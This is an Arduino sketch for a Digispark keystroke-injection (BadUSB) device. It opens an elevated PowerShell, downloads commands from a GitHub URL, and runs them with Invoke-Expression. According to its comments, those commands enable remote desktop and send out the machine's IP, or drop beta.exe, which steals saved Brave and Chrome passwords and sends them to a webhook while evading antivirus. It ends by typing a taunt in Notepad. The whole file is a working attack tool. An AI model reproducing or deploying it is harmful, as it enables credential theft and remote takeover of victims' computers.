#include "DigiKeyboard.h"
#define KEY_DOWN 0x51

void setup() {
  // Don't need to set anything up to use DigiKeyboard
}


void loop() {
  // Prevents missing first keystroke
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  //this part opens cmd with admin privilidges
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  //win+r
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell");  //type it in
  DigiKeyboard.delay(2000);
  DigiKeyboard.println(F("Start-Process powershell.exe -Verb RunAs; if ($?) { } else { powershell }"));//DigiKeyboard.println(F("Start-Process cmd.exe -ArgumentList '/k mode con: cols=70 lines=3' -Verb RunAs; if ($?) { exit } else { powershell }"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(6000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);


  //If windows pro is installed on the system ,this runs a script to enable remote desktop and sends ip to access the remote desktop(remote desktop only availible on windows pro)
  //but if os is not win pro, it just ignores this
  //this is faster than the previous one as it used to run irrespetive of the os
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //if win pro:
  DigiKeyboard.println(F("$edition = (Get-WmiObject -Class Win32_OperatingSystem).Caption; if ($edition -match 'Windows Pro') {"));
  DigiKeyboard.println(F("    $commands = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adhrit121/Data_storage/main/commands1and2' | Select-Object -ExpandProperty Content"));
  DigiKeyboard.println("    Write-Output $commands");
  DigiKeyboard.println("    Invoke-Expression $commands");
  //if not win pro:
  DigiKeyboard.println("} else {");
  DigiKeyboard.println(F("    $other_commands = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adhrit121/Data_storage/main/commands2' | Select-Object -ExpandProperty Content"));//this downloads beta.exe which gets saved brave and chrome passwords and sends them to webhook (normally this happens too fast for any antivirus to notice it but very rarely it is caught)
  DigiKeyboard.println("    Write-Output $other_commands");
  DigiKeyboard.println("    Invoke-Expression $other_commands");
  DigiKeyboard.println("}");
  DigiKeyboard.delay(100);

  //extra
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("notepad");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); // Press Alt+F to open the File menu
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_X); // Press X to select the "Maximize" option
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_N, MOD_CONTROL_RIGHT);
  DigiKeyboard.delay(750);
  DigiKeyboard.println("Oi");
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("Y");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("O");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("U");
  DigiKeyboard.delay(500);
  DigiKeyboard.println(".");
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("S");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("t");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("u");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("p");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("i");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("d");




  //Runtimes:
  //43sec to 71sec to 79sec to 50sec to 45 sec to 35sec(beta.exe caught) to 41sec to 40sec to 32sec
  DigiKeyboard.delay(90000);
}
